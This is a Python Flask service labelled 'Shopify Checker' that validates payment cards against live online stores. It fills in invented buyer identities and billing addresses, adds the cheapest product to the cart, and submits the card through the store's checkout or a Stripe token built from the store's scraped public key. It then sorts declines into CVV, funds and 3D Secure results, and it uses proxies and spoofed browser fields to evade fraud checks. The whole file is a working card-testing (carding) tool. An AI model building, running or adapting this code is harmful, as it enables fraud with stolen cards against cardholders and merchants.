from flask import Flask, jsonify, request
import requests
import re
import json
import os
import time
import random
import uuid
import logging
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    p = proxy_str.strip()
    ptype = 'http'
    m = re.match(r'^(socks5|socks4|http|https)://(.+)$', p, re.I)
    if m:
        ptype = m.group(1).lower()
        p = m.group(2)
    m = re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', p)
    if m:
        u, pw, h, port = m.groups()
        url = f'{ptype}://{u}:{pw}@{h}:{port}'
        return {'http': url, 'https': url}
    m = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', p)
    if m:
        h, port, u, pw = m.groups()
        url = f'{ptype}://{u}:{pw}@{h}:{port}'
        return {'http': url, 'https': url}
    m = re.match(r'^([^:@]+):(\d+)$', p)
    if m:
        h, port = m.groups()
        url = f'{ptype}://{h}:{port}'
        return {'http': url, 'https': url}
    return None

def random_name():
    first = random.choice(['James','John','Michael','William','David',
                           'Emma','Sophia','Olivia','Liam','Noah',
                           'Ava','Isabella','Mia','Charlotte','Amelia'])
    last  = random.choice(['Smith','Johnson','Williams','Brown','Davis',
                           'Miller','Wilson','Moore','Taylor','Anderson',
                           'Thomas','Jackson','White','Harris','Martin'])
    return first, last

def random_email(first, last):
    domains = ['gmail.com','yahoo.com','outlook.com','hotmail.com','icloud.com']
    num = random.randint(1, 999)
    patterns = [
        f"{first.lower()}.{last.lower()}{num}@{random.choice(domains)}",
        f"{first.lower()}{num}@{random.choice(domains)}",
        f"{first.lower()}_{last.lower()}@{random.choice(domains)}",
    ]
    return random.choice(patterns)

def random_billing():
    streets = ['Main St','Oak Ave','Maple Dr','Cedar Ln','Park Blvd',
               'Lake View Dr','River Rd','Hill St','Forest Ave','Sunset Blvd']
    data = [
        ('New York','NY','10001','US'),
        ('Los Angeles','CA','90001','US'),
        ('Chicago','IL','60601','US'),
        ('Houston','TX','77001','US'),
        ('Phoenix','AZ','85001','US'),
        ('Philadelphia','PA','19101','US'),
        ('San Antonio','TX','78201','US'),
        ('San Diego','CA','92101','US'),
        ('Dallas','TX','75201','US'),
        ('San Jose','CA','95101','US'),
    ]
    city, province, zip_code, country = random.choice(data)
    address = f"{random.randint(100,9999)} {random.choice(streets)}"
    phone   = f"+1{random.randint(2000000000,9999999999)}"
    return address, city, province, zip_code, country, phone

def get_stripe_token(card_data, stripe_key, site, session, proxy_dict):
    number, mm, yy, cvv, name = card_data
    headers = {
        'User-Agent':   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept':       'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin':       'https://js.stripe.com',
        'Referer':      'https://js.stripe.com/',
    }
    data = {
        'card[number]':    number,
        'card[exp_month]': mm,
        'card[exp_year]':  yy,
        'card[cvc]':       cvv,
        'card[name]':      name,
        'key':             stripe_key,
        'guid':            str(uuid.uuid4()),
        'muid':            str(uuid.uuid4()),
        'sid':             str(uuid.uuid4()),
        'payment_user_agent': 'stripe.js/v3',
        'referrer':        site,
        'time_on_page':    str(random.randint(30000, 120000)),
    }
    r = session.post(
        'https://api.stripe.com/v1/tokens',
        data=data, headers=headers,
        proxies=proxy_dict, timeout=20, verify=False
    )
    return r.json()

def shopify_check(cc, site, proxy_dict):
    start = time.time()

    try:
        parts = cc.strip().split('|')
        if len(parts) != 4:
            return {'Gateway': 'Unknown', 'Price': 0, 'Response': 'INVALID_FORMAT',
                    'Status': False, 'cc': cc}
        number, mm, yy, cvv = [p.strip() for p in parts]
        if len(yy) == 4: yy = yy[-2:]
        mm = mm.zfill(2)
    except:
        return {'Gateway': 'Unknown', 'Price': 0, 'Response': 'PARSE_ERROR',
                'Status': False, 'cc': cc}

    if not site.startswith('http'):
        site = 'https://' + site

    session = requests.Session()
    first, last = random_name()
    name  = f"{first} {last}"
    email = random_email(first, last)
    address, city, province, zip_code, country, phone = random_billing()

    base_headers = {
        'User-Agent':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                           '(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
    }

    try:
        # Step 1: Get cheapest product
        r = session.get(f"{site}/products.json?limit=20&sort_by=price-ascending",
                        headers=base_headers, proxies=proxy_dict,
                        timeout=15, verify=False)
        if r.status_code != 200:
            return build_resp(False, f'SITE_UNAVAILABLE_{r.status_code}', cc, site, 0, 'Unknown')

        products = r.json().get('products', [])
        if not products:
            return build_resp(False, 'NO_PRODUCTS', cc, site, 0, 'Unknown')

        cheapest_id    = None
        cheapest_price = 999999
        for p in products:
            for v in p.get('variants', []):
                price = float(v.get('price', 999999))
                if price > 0 and price < cheapest_price:
                    cheapest_price = price
                    cheapest_id    = v['id']

        if not cheapest_id:
            return build_resp(False, 'NO_VALID_VARIANT', cc, site, 0, 'Unknown')

        # Step 2: Add to cart
        r = session.post(
            f"{site}/cart/add.js",
            json={'id': cheapest_id, 'quantity': 1},
            headers={**base_headers,
                     'Content-Type': 'application/json',
                     'X-Requested-With': 'XMLHttpRequest',
                     'Referer': site},
            proxies=proxy_dict, timeout=15, verify=False
        )
        if r.status_code not in [200, 201]:
            return build_resp(False, f'CART_ERROR_{r.status_code}', cc, site, cheapest_price, 'Unknown')

        # Step 3: Get checkout page
        r = session.get(
            f"{site}/checkout",
            headers={**base_headers, 'Referer': site},
            proxies=proxy_dict, timeout=15,
            verify=False, allow_redirects=True
        )
        checkout_url = r.url
        html         = r.text

        # Detect gateway
        gateway    = 'Shopify Payments'
        stripe_key = None

        m = re.search(r'(pk_live_[a-zA-Z0-9]{20,})', html)
        if m:
            stripe_key = m.group(1)
            gateway    = 'Stripe'

        if 'braintree' in html.lower():
            gateway = 'Braintree'
        elif 'paypal' in html.lower() and not stripe_key:
            gateway = 'PayPal'

        # Step 4: Fill contact info
        contact_data = {
            'utf8':                                    '✓',
            '_method':                                 'patch',
            'previous_step':                           'contact_information',
            'step':                                    'shipping_method',
            'checkout[email]':                         email,
            'checkout[shipping_address][first_name]':  first,
            'checkout[shipping_address][last_name]':   last,
            'checkout[shipping_address][address1]':    address,
            'checkout[shipping_address][city]':        city,
            'checkout[shipping_address][province]':    province,
            'checkout[shipping_address][country]':     country,
            'checkout[shipping_address][zip]':         zip_code,
            'checkout[shipping_address][phone]':       phone,
            'button':                                  '',
        }
        r = session.post(
            checkout_url,
            data=contact_data,
            headers={**base_headers,
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'Referer':      checkout_url},
            proxies=proxy_dict, timeout=20,
            verify=False, allow_redirects=True
        )
        checkout_url = r.url
        html         = r.text

        # Step 5: Get shipping
        shipping_rate = None
        m = re.search(r'name="checkout\[shipping_rate\]\[id\]"\s+value="([^"]+)"', html)
        if m:
            shipping_rate = m.group(1)

        if shipping_rate:
            shipping_data = {
                'utf8':                             '✓',
                '_method':                          'patch',
                'previous_step':                    'shipping_method',
                'step':                             'payment_method',
                'checkout[shipping_rate][id]':      shipping_rate,
                'button':                           '',
            }
            r = session.post(
                checkout_url,
                data=shipping_data,
                headers={**base_headers,
                         'Content-Type': 'application/x-www-form-urlencoded',
                         'Referer':      checkout_url},
                proxies=proxy_dict, timeout=20,
                verify=False, allow_redirects=True
            )
            checkout_url = r.url
            html         = r.text

        # Get authenticity token
        auth_token = None
        m = re.search(r'name="authenticity_token"\s+value="([^"]+)"', html)
        if m:
            auth_token = m.group(1)

        # Get payment gateway ID
        gateway_id = None
        m = re.search(r'data-select-gateway="(\d+)"', html)
        if not m:
            m = re.search(r'"id":(\d+),"payment_terms_required"', html)
        if m:
            gateway_id = m.group(1)

        # Step 6: Submit payment
        if stripe_key:
            # Stripe flow
            tok = get_stripe_token(
                (number, mm, yy, cvv, name),
                stripe_key, site, session, proxy_dict
            )

            if 'id' not in tok:
                err  = tok.get('error', {})
                msg  = err.get('message', 'Token failed')
                code = err.get('code', '')
                dc   = err.get('decline_code', '')
                resp = classify(msg, code, dc)
                return build_resp(resp['status'], resp['response'],
                                  cc, site, cheapest_price, 'Stripe Auth')

            stripe_token = tok['id']

            pay_data = {
                'utf8':                          '✓',
                '_method':                       'patch',
                'authenticity_token':            auth_token or '',
                'previous_step':                 'payment_method',
                'step':                          '',
                'checkout[payment_gateway]':     gateway_id or '',
                'checkout[credit_card][vault]':  'false',
                's':                             stripe_token,
                'checkout[total_price]':         str(int(cheapest_price * 100)),
                'complete':                      '1',
                'checkout[client_details][browser_width]':  '1280',
                'checkout[client_details][browser_height]': '800',
                'checkout[client_details][javascript_enabled]': '1',
            }
        else:
            # Direct card flow
            pay_data = {
                'utf8':                                            '✓',
                '_method':                                         'patch',
                'authenticity_token':                             auth_token or '',
                'previous_step':                                   'payment_method',
                'step':                                            '',
                'checkout[payment_gateway]':                       gateway_id or '',
                'checkout[credit_card][number]':                   number,
                'checkout[credit_card][name]':                     name,
                'checkout[credit_card][month]':                    mm,
                'checkout[credit_card][year]':                     yy,
                'checkout[credit_card][verification_value]':       cvv,
                'checkout[billing_address][first_name]':           first,
                'checkout[billing_address][last_name]':            last,
                'checkout[billing_address][address1]':             address,
                'checkout[billing_address][city]':                 city,
                'checkout[billing_address][province]':             province,
                'checkout[billing_address][country]':              country,
                'checkout[billing_address][zip]':                  zip_code,
                'checkout[billing_address][phone]':                phone,
                'checkout[total_price]':                           str(int(cheapest_price * 100)),
                'complete':                                        '1',
            }

        r = session.post(
            checkout_url,
            data=pay_data,
            headers={**base_headers,
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'Referer':      checkout_url},
            proxies=proxy_dict, timeout=30,
            verify=False, allow_redirects=True
        )

        elapsed = round(time.time() - start, 2)
        return parse_response(r, cc, site, cheapest_price, gateway, elapsed)

    except Exception as ex:
        elapsed = round(time.time() - start, 2)
        logger.error(f"Error: {ex}")
        return build_resp(False, str(ex)[:80].upper().replace(' ', '_'),
                          cc, site, 0, 'Unknown')

def parse_response(r, cc, site, price, gateway, elapsed):
    html = r.text
    url  = r.url.lower()
    low  = html.lower()

    # Approved - Shopify redirects to thank_you page
    if 'thank_you' in url or '/orders/' in url:
        return build_resp(True, 'PAYMENT_APPROVED', cc, site, price, gateway)

    # 3D Secure - Shopify shows redirect or requires action
    if any(k in low for k in [
        'three_d_secure', 'redirect_to_url', 'use_stripe_sdk',
        'authentication_required', '3d secure', 'authenticate your card',
        'pending_redirect', 'requires_action', 'acs_url',
        'tds_flow', 'cardinal', 'centinel'
    ]):
        return build_resp(False, 'AUTHENTICATION_REQUIRED', cc, site, price, gateway)

    # CVV - real Shopify messages
    if any(k in low for k in [
        'security code', 'card security code', 'cvv', 'cvc2',
        'incorrect_cvc', 'security_code_incorrect',
        'card_incorrect_cvc', 'incorrect security',
        'enter the cvv', 'card verification'
    ]):
        return build_resp(False, 'CARD_ISSUER_DECLINED_CVV', cc, site, price, gateway)

    # Insufficient funds
    if any(k in low for k in [
        'insufficient funds', 'insufficient_funds',
        'not sufficient funds', 'exceeds your current balance',
        'exceed.*limit', 'over.*limit'
    ]):
        return build_resp(False, 'INSUFFICIENT_FUNDS', cc, site, price, gateway)

    # Extract REAL Shopify error from page
    # Shopify puts errors in these specific elements
    patterns = [
        r'data-checkout-payment-error="([^"]+)"',
        r'id="payment-errors"[^>]*>\s*<p[^>]*>\s*(.*?)\s*</p>',
        r'class="notice__text"[^>]*>\s*(.*?)\s*</',
        r'class="content-box__row"[^>]*>\s*<p[^>]*>\s*(.*?)\s*</p>',
        r'"error_code"\s*:\s*"([^"]+)"',
        r'"decline_code"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
        r'class="error-message[^"]*"[^>]*>\s*(.*?)\s*</',
        r'id="checkout-error-message"[^>]*>\s*(.*?)\s*</',
    ]
    for pat in patterns:
        m = re.search(pat, html, re.DOTALL | re.I)
        if m:
            msg = re.sub(r'<[^>]+>', '', m.group(1)).strip()
            msg = re.sub(r'\s+', ' ', msg).strip()
            if msg and len(msg) > 3 and len(msg) < 200:
                # Convert to afuona style UPPER_SNAKE_CASE
                clean = msg.upper().replace(' ', '_').replace('-', '_')
                clean = re.sub(r'[^A-Z0-9_]', '', clean)[:80]
                if clean:
                    return build_resp(False, clean, cc, site, price, gateway)

    return build_resp(False, 'CARD_DECLINED', cc, site, price, gateway)

def classify(msg, code='', dc=''):
    m = (msg or '').lower()
    c = (code or '').lower()
    d = (dc or '').lower()
    if any(k in m for k in ['security code','cvc','cvv','incorrect_cvc']) or \
       c in ('incorrect_cvc','security_code_incorrect') or \
       d in ('incorrect_cvc','security_code_incorrect'):
        return {'status': False, 'response': 'CARD_ISSUER_DECLINED_CVV'}
    if any(k in m for k in ['authentication','3d','secure','requires_action']):
        return {'status': False, 'response': 'AUTHENTICATION_REQUIRED'}
    if any(k in m for k in ['insufficient','funds','do not honor']):
        return {'status': False, 'response': 'INSUFFICIENT_FUNDS'}
    if any(k in m for k in ['approved','success','succeeded']):
        return {'status': True, 'response': 'PAYMENT_APPROVED'}
    clean = (msg or 'CARD_DECLINED').upper().replace(' ', '_')[:80]
    return {'status': False, 'response': clean}

def build_resp(status, response, cc, site, price, gateway):
    return {
        'Gateway':         gateway,
        'Price':           round(float(price), 2),
        'Response':        response,
        'Status':          True,
        'active_requests': 0,
        'cc':              cc,
        'parallel_mode':   True,
        'approved':        status,
    }

@app.route('/')
def home():
    return jsonify({
        'api':      'Shopify Checker',
        'endpoint': '/shopify?site=SITE&cc=NUMBER|MM|YY|CVV&proxy=PROXY',
    })

@app.route('/shopify')
def shopify():
    try:
        site      = request.args.get('site', '').strip()
        cc        = request.args.get('cc', '').strip()
        proxy_str = request.args.get('proxy', '').strip()

        if not site:
            return jsonify({'error': 'Missing site'}), 400
        if not cc:
            return jsonify({'error': 'Missing cc'}), 400
        cc = cc.replace('%7C', '|').replace('%7c', '|')
        if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
            return jsonify({'error': 'Invalid cc format'}), 400

        proxy_dict = parse_proxy(proxy_str) if proxy_str else None
        result     = shopify_check(cc, site, proxy_dict)
        return jsonify(result)

    except Exception as ex:
        logger.error(f'Error: {ex}')
        return jsonify({'error': str(ex)}), 500

@app.route('/health')
def health():
    return jsonify({'status': 'ok'}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8000))
    print(f"Shopify API running on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
